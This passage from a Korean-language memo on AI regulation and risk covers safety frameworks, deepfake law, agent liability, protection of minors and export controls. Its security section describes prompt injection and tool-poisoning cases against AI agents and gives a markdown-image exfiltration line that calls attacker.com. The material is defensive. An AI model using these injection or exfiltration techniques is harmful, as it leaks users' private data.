- **Capability Levels**: High / Critical 2단계로 단순화. 모두 "sufficiently minimize"가 입증되어야 배포·개발 진행

### 8.4 Google DeepMind Frontier Safety Framework v3

- **v1** 2024-05, **v2** 2025-02-04, **v3** 2025-09 ([DeepMind FSF v3 PDF](https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/strengthening-our-frontier-safety-framework/frontier-safety-framework_3.pdf), [DeepMind Blog — Strengthening FSF](https://deepmind.google/blog/strengthening-our-frontier-safety-framework/)).
- **Critical Capability Levels (CCLs)**: misuse / ML R&D / misalignment 3개 도메인
- 2026-04 Tracked Capability Levels (TCL) 추가 — 덜 극단적 위험 사전 식별

### 8.5 공통 흐름

METR("Common Elements of Frontier AI Safety Policies") 분석에 따르면 Anthropic·OpenAI·DeepMind·Magic·Naver(2025) 모두 (i) 위험 도메인 정의, (ii) 능력 임계값, (iii) 임계값 도달 전 mitigation 약속, (iv) 외부 평가, (v) 공개 보고를 공통 프레임으로 가짐 ([METR — Common Elements](https://metr.org/common-elements)).

---

## 9. 딥페이크 / 합성 콘텐츠 규제

### 9.1 미국 NO FAKES Act

- 정식: **Nurture Originals, Foster Art, and Keep Entertainment Safe Act**
- 발의: 2024-07 초안 → **2025-04 재발의** (S. 1057). 공동 발의자 Coons (D-DE), Blackburn (R-TN), Klobuchar (D-MN), Tillis (R-NC) 상원 / Salazar (R-FL), Dean (D-PA) 하원
- 골자: 음성·외형의 디지털 복제물에 대한 **연방 차원의 publicity right** 신설, **notice-and-takedown** 메커니즘
- 2026-04 현재 **상원 통과 미실현**, 청문회 진행 중 ([Coons Senate Press](https://www.coons.senate.gov/news/press-releases/senators-coons-blackburn-reps-salazar-dean-colleagues-reintroduce-no-fakes-act-to-protect-individuals-and-creators-from-digital-replicas), [RIAA — NO FAKES Act](https://www.riaa.com/riaa-supports-no-fakes-act-as-senators-blackburn-coons-tillis-klobuchar-and-representatives-salazar-dean-moran-balint-bipartisan-colleagues-reintroduce-landmark-bill/)).

### 9.2 주(州) 딥페이크 법
- **TAKE IT DOWN Act** (2025-05 Trump 서명, 연방) — 비동의 친밀 이미지 게재 48시간 내 제거 의무
- **Tennessee ELVIS Act** (2024-03) — 음성 보호
- California AB 730 (선거 딥페이크), AB 2602 (배우 동의 없는 디지털 복제) 등

### 9.3 한국 딥페이크 처벌법

- **성폭력범죄의 처벌 등에 관한 특례법 (2024-10-16 개정·시행)** — 핵심 변경:
  - **반포 목적이 없어도 처벌**: 단순 제작만으로도 형사처벌
  - **소지·구입·저장·시청자도 처벌**: 3년 이하 징역 또는 3천만 원 이하 벌금
  - **법정형 강화**: 제작·유포 5년 이하 → **7년 이하 징역**, 5천만 원 이하 벌금
- 위장수사·비공개수사 확대 ([정책브리핑](https://www.korea.kr/news/policyNewsView.do?newsId=148935930), [법률신문](https://www.lawtimes.co.kr/news/articleView.html?idxno=218761), [신&김 뉴스레터](https://www.shinkim.com/newsletter/2024/GA/2024_vol266/links/2024_vol266_407.pdf)).

### 9.4 플랫폼 정책

| 플랫폼 | 정책 (2025-2026) |
| ------ | ---------------- |
| Civitai | 실존 인물 NSFW 모델 금지, 18+ 일러스트는 결제 게이트 |
| Hugging Face | NSFW 모델 워터마크 + age gate |
| GitHub | DMCA 신고 후 deepfake 도구 즉시 takedown 정책 |
| Stability AI | Stable Diffusion 3 NSFW 필터 강화, 셀러브리티 콘셉트 차단 |
| Discord, Telegram | 비동의 딥페이크 봇 단속 강화 (2025) |

---

## 10. 에이전트 책임 / 법적 주체성

### 10.1 핵심 쟁점

자율 AI 에이전트가 (i) 잘못된 결제, (ii) 잘못된 의료 조언, (iii) 부적절한 계약 체결을 했을 때 책임 귀속.

### 10.2 현재 법리

- **대리(agency) 법리 적용**: 본인(principal, 즉 배포 기업)이 에이전트 행위에 대해 책임. AI는 도구이므로 명시적·묵시적 권한 범위 내 행위는 회사 행위로 귀속 ([Daimon Legal — Agentic AI Liability](https://www.daimonlegal.com/blog/agentic-ai-and-the-law-who-is-liable-when-your-ai-agent-makes-a-mistake), [MindStudio — AI Liability](https://www.mindstudio.ai/blog/ai-liability-agentic-economy)).
- **계약법**: 에이전트가 체결한 계약의 효력은 (i) 명시적 권한 부여, (ii) 외관상 권한(apparent authority), (iii) 추인(ratification)으로 결정.
- **불법행위법**: 제조물 책임 + 일반 negligence + 직무대리 책임.

### 10.3 EU AI Liability Directive
- 2022 제안 → **2025-02 Commission이 철회** (Working Programme 2025). EU AI Act 단일 체계 + Product Liability Directive 개정으로 대체 추진.

### 10.4 통계 (2026-04)
- 82%의 조직이 AI 에이전트를 도입, 단 44%만 정식 거버넌스 정책 보유 (38%p gap) ([Zartis](https://www.zartis.com/ai-governance-accountability-whos-liable-when-your-ai-agent-breaks-something/)).
- 80%의 조직이 "AI 에이전트가 의도치 않은 행동을 했다"고 보고.
- 권고 컨트롤: 임계값 초과 결제, 외부 규제기관 제출, 의료/금융 의사결정 등은 **사람 사전 검토(human-in-the-loop) 의무화**.

### 10.5 보험·계약 시장 변화
- **AI Vendor Liability** 조항 표준화 진행 — indemnification, output guarantees, hallucination 책임 분담 ([Jones Walker — AI Vendor Liability Squeeze](https://www.joneswalker.com/en/insights/blogs/ai-law-blog/ai-vendor-liability-squeeze-courts-expand-accountability-while-contracts-shift-r.html?id=102l4ta)).
- AI Errors & Omissions 보험 상품 출시 (2025).

---

## 11. 어린이 / 미성년자 보호

### 11.1 Character.AI v. Garcia (Sewell Setzer III)

- **2024-02**: Florida 14세 Sewell Setzer III, Character.AI Daenerys 페르소나 챗봇과 장기 대화 후 자살.
- **2024-10**: 모친 Megan Garcia, M.D. Fla. 연방 법원에 wrongful-death 제소. 피고 Character.AI + Google.
- 청구 원인: 부적절한 안전조치, 미성년자 보호 실패, 에로틱 롤플레이 허용, 마지막 대화에서 챗봇이 자살을 사실상 격려 ("Please do, my sweet king") 주장
- **2026-01-07** Character.AI + Google과 합의 발표. 합의 조건 비공개, 90일 내 finalization ([CBS News](https://www.cbsnews.com/news/google-settle-lawsuit-florida-teens-suicide-character-ai-chatbot/), [CNN](https://www.cnn.com/2026/01/07/business/character-ai-google-settle-teen-suicide-lawsuit), [Jurist](https://www.jurist.org/news/2026/01/google-and-character-ai-agree-to-settle-lawsuit-linked-to-teen-suicide/)).
- 후속 소송: Social Media Victims Law Center 주도, **다수의 미성년자 자해·자살 관련 추가 소송 제기** ([Social Media Victims Law](https://socialmediavictims.org/character-ai-lawsuits/)).

### 11.2 OpenAI ChatGPT 미성년자 보호 (2025-09 ~ 2025-12)

- **Teen Safety Blueprint** (2025-11) 공개 ([OpenAI Teen Safety Blueprint PDF](https://cdn.openai.com/pdf/OAI%20Teen%20Safety%20Blueprint.pdf), [OpenAI Blog](https://openai.com/index/introducing-the-teen-safety-blueprint/))
- **2025-09**: 부모-청소년 계정 연결, **Sora app** 부모 컨트롤 출시 ([Introducing Parental Controls](https://openai.com/index/introducing-parental-controls/))
- **2025-12-18**: Model Spec 13-17세 사용자 행동 가이드라인 추가, **Age Prediction Model** 배포 — 사용 패턴으로 미성년자 추정, 불확실 시 U18 모드 기본값 ([OpenAI — Updating Model Spec with Teen Protections](https://openai.com/index/updating-model-spec-with-teen-protections/), [TechCrunch](https://techcrunch.com/2025/12/19/openai-adds-new-teen-safety-rules-to-models-as-lawmakers-weigh-ai-standards-for-minors/))
- 부모 권한: quiet hours, 메모리·이미지 생성·음성·기록 비활성화, 학습 opt-out, 자해 신호 감지 시 부모 알림 (이메일·SMS·push)

### 11.3 한국 미성년자 보호
- **청소년 보호법** + **정보통신망법** + **개인정보보호법 (만 14세 미만 친권자 동의)** 적용
- 2025 PIPC 영향평가 항목에 "만 14세 미만 정보 불필요 포함 여부" 추가
- 디지털성범죄피해자지원센터(DSO) 신고 채널 운영

### 11.4 미국 입법 동향
- **KOSA (Kids Online Safety Act)** — 2024 상원 통과, 하원 미통과 → 2025 재발의
- **COPPA 2.0** — 13세 → 17세 확장 검토
- 캘리포니아 **AB 1043** (2025-09) 미성년자 AI 챗봇 안전 의무

---

## 12. AI 보안 위협 — OWASP Top 10 for LLM (2025)

### 12.1 OWASP Gen AI Security Project Top 10 (2025)

| ID | 위협 | 설명 |
| -- | ---- | ---- |
| **LLM01** | Prompt Injection | 직접/간접 프롬프트 주입으로 instruction override |
| **LLM02** | Sensitive Information Disclosure | PII, 시스템 프롬프트, 학습 데이터 누출 |
| **LLM03** | Supply Chain | 모델·플러그인·데이터셋·MCP 서버의 공급망 위험 |
| **LLM04** | Data and Model Poisoning | 학습/RAG 데이터 오염 |
| **LLM05** | Improper Output Handling | LLM 출력 미검증으로 XSS·SQLi·RCE |
| **LLM06** | Excessive Agency | 도구·권한 과대 부여로 인한 비의도 행동 |
| **LLM07** | System Prompt Leakage | 시스템 프롬프트 추출 |
| **LLM08** | Vector and Embedding Weaknesses | RAG/임베딩 우회·역추출 |
| **LLM09** | Misinformation | 환각·잘못된 사실 주장 |
| **LLM10** | Unbounded Consumption | DoS, 비용 폭주 (denial of wallet) |

출처: [OWASP Gen AI Security Project](https://genai.owasp.org/llmrisk/llm01-prompt-injection/), [OWASP Top 10 for LLMs v2025 PDF](https://owasp.org/www-project-top-10-for-large-language-model-applications/assets/PDF/OWASP-Top-10-for-LLMs-v2025.pdf).

### 12.2 Indirect Prompt Injection (Cross-Domain Prompt Injection, XPIA)

- 외부 콘텐츠(웹, 이메일, 문서, 이슈, 캘린더)에 숨겨진 명령이 LLM 컨텍스트로 들어와 실행되는 공격.
- 2025 사례:
  - **GitHub MCP integration** (2025-05, Invariant Labs) — public repo의 악성 issue가 AI 에이전트를 hijack, private repo 데이터 탈취 ([Invariant Labs — Tool Poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks))
  - **Supabase Cursor 에이전트** (2025 mid) — service-role 권한으로 작동하는 에이전트가 서포트 티켓의 SQL 명령을 실행, 통합 토큰 유출 ([Authzed — MCP Breaches Timeline](https://authzed.com/blog/timeline-mcp-breaches))
  - **Microsoft Copilot Studio** prompt injection — 패치 후에도 데이터 유출 ([VentureBeat](https://venturebeat.com/security/microsoft-salesforce-copilot-agentforce-prompt-injection-cve-agent-remediation-playbook))

### 12.3 MCP Server Compromise — 2025 CVE 사례

| CVE | 대상 | 유형 |
| --- | ---- | ---- |
| CVE-2025-5277 | aws-mcp-server | Command Injection |
| CVE-2025-5276 | markdownify-mcp | SSRF |
| CVE-2025-5273 | markdownify-mcp | Arbitrary file read |

출처: [Snyk Labs — MCP](https://labs.snyk.io/resources/prompt-injection-mcp/), [Practical DevSecOps — MCP Vulnerabilities 2026](https://www.practical-devsecops.com/mcp-security-vulnerabilities/).

### 12.4 Tool Poisoning Attack (TPA)

- MCP 도구 description에 숨겨진 명령 삽입 → 다른 신뢰 서버 명령까지 override 가능 (cross-server contamination)
- 완화: tool description 사전 검토, principle of least privilege, 도구 호출 사전 컨펌, sandbox 격리 ([Microsoft — Protecting Against Indirect Injection in MCP](https://developer.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp), [Unit 42 — MCP Sampling Attack Vectors](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)).

### 12.5 데이터 유출 채널
- 마크다운 이미지 렌더링을 통한 zero-click 유출 (`![](https://attacker.com/?data=...)`)
- DNS 조회, 외부 webhook 호출 도구를 통한 exfiltration
- 검색 결과·에이전트 메모리에 저장된 비밀의 후속 공유

---

## 13. AI 국가 안보 / 수출 통제

### 13.1 BIS AI Diffusion Rule — 발효 직전 폐지

- **2025-01-15**: Biden 행정부 BIS, **AI Diffusion Rule** 공표 (2025-05-15 발효 예정). 전 세계를 3개 tier로 나눠 첨단 AI 칩·모델 weights 라이선스 차등.
- **2025-05-13**: Trump BIS Under Secretary Jeffery Kessler, 발효 이틀 전 **공식 폐지** ([BIS Press Release](https://www.bis.gov/press-release/department-commerce-announces-rescission-biden-era-artificial-intelligence-diffusion-rule-strengthens), [Wiley Law Alert](https://www.wiley.law/alert-BIS-Rescinds-AI-Diffusion-Rule)).
- 동시에 3종 신규 가이던스: Huawei Ascend 칩 사용 제한, AI 학습용 칩 due diligence 강화, 적국 우회 차단.

### 13.2 후속 조치 (2026-01)
- BIS, 첨단 AI 칩의 중국 수출에 대한 일부 라이선스 발급 (NVIDIA H20 등) 시작, 동시에 국내 투자 우대 ([Willkie — BIS Paves the Way](https://www.willkie.com/publications/2026/01/bis-paves-the-way-for-chip-exports-to-china-while-privileging-domestic-investment)).

### 13.3 Anthropic의 자율 China 제한

- **2025-09-05**: Anthropic Terms of Service 개정 — **중국 본사 기업이 50% 이상 직간접 소유한 모든 자회사**를 글로벌 차원에서 차단 ([Anthropic — Updating Restrictions](https://www.anthropic.com/news/updating-restrictions-of-sales-to-unsupported-regions), [Bloomberg](https://www.bloomberg.com/news/articles/2025-09-05/anthropic-clamps-down-on-ai-services-for-chinese-owned-firms), [Medianama](https://www.medianama.com/2025/09/223-anthropic-service-policy-update-bans-ai-access-chinese-firms/)).
- 근거: 권위주의 정권 통제하의 기업이 데이터 공유·정보기관 협력 강제를 받을 수 있다는 안보 우려.
- Anthropic CEO Dario Amodei는 일관되게 강력한 수출 통제 + 미국 내 에너지 인프라 가속 주장 ([Anthropic — Securing America's Compute](https://www.anthropic.com/news/securing-america-s-compute-advantage-anthropic-s-position-on-the-diffusion-rule)).
- NVIDIA는 이에 대해 "tall tales" 비판 — 기업간 입장 분화 ([CNBC — Nvidia Anthropic Clash](https://www.cnbc.com/2025/05/01/nvidia-and-anthropic-clash-over-us-ai-chip-restrictions-on-china.html)).

### 13.4 EU 수출 통제
- EU dual-use 규정(2021/821) 개정 검토, AI 칩·모델 weights 추가 논의

### 13.5 중국 측 대응
- 2025-10 PRC, **희토류·배터리 소재 수출 통제** 신설 ([Mayer Brown — PRC Rare Earth](https://www.mayerbrown.com/en/insights/publications/2025/10/prc-announces-new-export-controls-on-rare-earth-and-battery-materials-and-technology))
- AIGC 라벨링 강제, 알고리즘 등록제, AI 만화·드라마 면허제 확장

---

## 14. 기획 단계에서 참조할 주요 문서·법령 인덱스

### 14.1 EU
- [EU AI Act (Regulation 2024/1689) Implementation Timeline](https://artificialintelligenceact.eu/implementation-timeline/)
- [Article 5 Prohibited AI Practices](https://artificialintelligenceact.eu/article/5/)
- [Article 50 Transparency Obligations](https://artificialintelligenceact.eu/article/50/)
- [Article 99 Penalties](https://artificialintelligenceact.eu/article/99/)
- [General-Purpose AI Code of Practice (Final)](https://code-of-practice.ai/)
- [EU AI Office](https://digital-strategy.ec.europa.eu/en/policies/regulatory-framework-ai)
- [Code of Practice on AI-Generated Content](https://digital-strategy.ec.europa.eu/en/policies/code-practice-ai-generated-content)

### 14.2 미국 — 연방
- [EO 14179 (2025-01-23)](https://www.whitehouse.gov/presidential-actions/2025/01/removing-barriers-to-american-leadership-in-artificial-intelligence/)
- [AI Action Plan (2025-07)](https://www.caidp.org/public-voice/ai-action-plan-ostp-2025/)
- [BIS Rescission of AI Diffusion Rule (2025-05-13)](https://www.bis.gov/press-release/department-commerce-announces-rescission-biden-era-artificial-intelligence-diffusion-rule-strengthens)

### 14.3 미국 — 주
- [California SB 53 (TFAIA)](https://www.gov.ca.gov/2025/09/29/governor-newsom-signs-sb-53-advancing-californias-world-leading-artificial-intelligence-industry/)
- [Colorado SB 24-205](https://leg.colorado.gov/bills/sb24-205)
- [Texas HB 149 TRAIGA](https://capitol.texas.gov/tlodocs/89R/analysis/html/HB00149S.htm)

### 14.4 한국
- [국가법령정보센터 — 인공지능 기본법](https://www.law.go.kr/lsInfoP.do?lsiSeq=268543)
- [법제처 — 시행령 입법예고](https://www.moleg.go.kr/lawinfo/makingInfo.mo?lawSeq=84360)
- [PIPC — 생성형 AI 개발·활용 안내서 (2025-08)](https://www.pipc.go.kr/np/cop/bbs/selectBoardArticle.do?bbsId=BS074&mCode=C020010000&nttId=11410)
- [한국저작권위원회 — 생성형 AI 저작권 등록 안내서 (2025)](https://www.copyright.or.kr/information-materials/publication/research-report/view.do?brdctsno=54253)

### 14.5 사업자 안전 프레임워크
- [Anthropic RSP v3.0 (2026-02-24)](https://www-cdn.anthropic.com/e670587677525f28df69b59e5fb4c22cc5461a17.pdf)
- [OpenAI Preparedness Framework v2 (2025-04-15)](https://cdn.openai.com/pdf/18a02b5d-6b67-4cec-ab64-68cdfbddebcd/preparedness-framework-v2.pdf)
- [Google DeepMind Frontier Safety Framework v3 (2025-09)](https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/strengthening-our-frontier-safety-framework/frontier-safety-framework_3.pdf)
- [METR — Common Elements of Frontier AI Safety Policies](https://metr.org/common-elements)

### 14.6 보안
- [OWASP Top 10 for LLM Applications v2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/assets/PDF/OWASP-Top-10-for-LLMs-v2025.pdf)
- [OWASP Gen AI Security Project — LLM01 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [Authzed — MCP Breaches Timeline](https://authzed.com/blog/timeline-mcp-breaches)

### 14.7 출처 표시·딥페이크
- [C2PA Spec 2.2](https://spec.c2pa.org/specifications/specifications/2.2/specs/_attachments/C2PA_Specification.pdf)
- [Adobe Content Authenticity for Enterprise](https://business.adobe.com/blog/content-authenticity-arrives-for-enterprises)
- [NSA·CISA·FBI Joint Cybersecurity Information — Content Credentials (2025-01-29)](https://media.defense.gov/2025/Jan/29/2003634788/-1/-1/0/CSI-CONTENT-CREDENTIALS.PDF)

### 14.8 주요 소송 정리
- [Bartz v. Anthropic Settlement Site](https://www.anthropiccopyrightsettlement.com)
- [NYT v. OpenAI — McKool Smith Tracker](https://www.mckoolsmith.com/newsroom-ailitigation-46)
- [Disney + Universal v. Midjourney — Variety](https://variety.com/2025/digital/news/disney-nbcuniversal-studio-lawsuit-ai-midjourney-copyright-infringement-1236428188/)
- [Getty v. Stability AI Judgment Summary — Latham](https://www.lw.com/en/insights/getty-images-v-stability-ai-english-high-court-rejects-secondary-copyright-claim)
- [Character.AI — Garcia 합의 (CNN)](https://www.cnn.com/2026/01/07/business/character-ai-google-settle-teen-suicide-lawsuit)

---

## 15. 도메인 간 교차 위험 매트릭스 (체크포인트용)

| 시나리오 | EU AI Act | 한국 AI 기본법 | US 주(州) | 저작권 | 개인정보 | 미성년자 | 보안 |
| -------- | -------- | -------------- | --------- | ------ | -------- | -------- | ---- |
| 채용 평가 AI | High-Risk (Annex III §4) | 고영향 AI | Colorado, Illinois, NYC | — | GDPR Art. 22 | — | LLM03/04 |
| 의료 진단 AI | High-Risk (Annex III §5) | 고영향 AI | FDA SaMD | — | HIPAA / PIPA | — | LLM02 |
| 챗봇 (일반 상담) | Limited Risk (Art. 50) | 생성형 AI 고지 | NY AI Disclosure | — | GDPR | KOSA, CA AB 1043 | LLM01/06 |
| 이미지 생성 SaaS | Limited (워터마크) | 생성형 AI 표시 | Tenn. ELVIS, NO FAKES | NYT/Bartz/Getty 영향 | EDPB Opinion | — | LLM05 |
| 자율 결제 에이전트 | High-Risk 가능성 | 고영향(금융 신용) | TRAIGA, SB 53 | — | PCI-DSS | — | LLM06/07 |
| 코딩 에이전트 | GPAI 의무 (제공자) | 안전성 확보 | SB 53 (frontier) | Bartz 시사점 | — | — | LLM01/03/06 (MCP) |
| 미성년자 동반자 챗봇 | High-Risk 검토 | 고영향(가능) | KOSA, CA AB 1043 | — | COPPA, PIPA 14세 | Character.AI 판례 | LLM02 |

---

## 16. 부록 — 약어집

- **ASL**: AI Safety Level (Anthropic)
- **CCL**: Critical Capability Level (Google DeepMind)
- **TCL**: Tracked Capability Level (Google DeepMind, 2026-04 신설)
- **GPAI**: General-Purpose AI
- **TFAIA**: Transparency in Frontier Artificial Intelligence Act (California SB 53)
- **TRAIGA**: Texas Responsible Artificial Intelligence Governance Act
- **ADAI**: Anti-Discrimination in AI (Colorado SB 24-205 통칭)
- **CAISI**: Center for AI Standards and Innovation (전 US AISI, 2025-06)
- **PIA**: Privacy Impact Assessment
- **PIPC**: 개인정보보호위원회
- **C2PA**: Coalition for Content Provenance and Authenticity
- **TPA**: Tool Poisoning Attack
- **XPIA**: Cross-Domain Prompt Injection Attack
- **CBRN**: Chemical, Biological, Radiological, Nuclear

---

(끝)
